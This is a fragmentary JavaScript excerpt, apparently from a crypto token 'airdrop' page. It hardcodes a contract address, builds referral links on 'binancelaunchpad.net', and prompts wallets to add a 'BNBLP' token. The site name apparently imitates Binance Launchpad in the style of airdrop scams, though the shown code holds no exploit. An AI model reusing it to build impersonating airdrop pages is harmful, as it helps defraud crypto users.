...
let addr;
const sttaddr = "0x219d483af39c27e99df8db87d08733ec3c2c2a00";
const sttabi = [{
    "constant": false,
    "inputs": [{
        "name": "_refer",
...
const getAirdrop = async () => {
    ...
    if (gettkbl == 0) {
        ...
        if (fresh === "")
            fresh = "0x219d483af39c27e99df8db87d08733ec3c2c2a00";
...
function getreflink() {
    ...
    if (!document.getElementById('refaddress').value) {
        ...
        if (!/^(0x){1}[0-9a-fA-F]{40}$/i.test(referaladd)) {
            ...
            document.getElementById('refaddress').value = 'https://binancelaunchpad.net/?ref=' + document.getElementById('refaddress').value;
        }
    }
}
    ...
    try {
        web3.currentProvider.sendAsync({
            ...
            params: {
                'type': 'BEP 20',
                'options': {
                    'address': '0x219d483af39c27e99df8db87d08733ec3c2c2a00',
                    'symbol': 'BNBLP',
                    'decimals': '18',
                    'image': 'https://binancelaunchpad.net/assets/images/safewex.png',
                },
            },
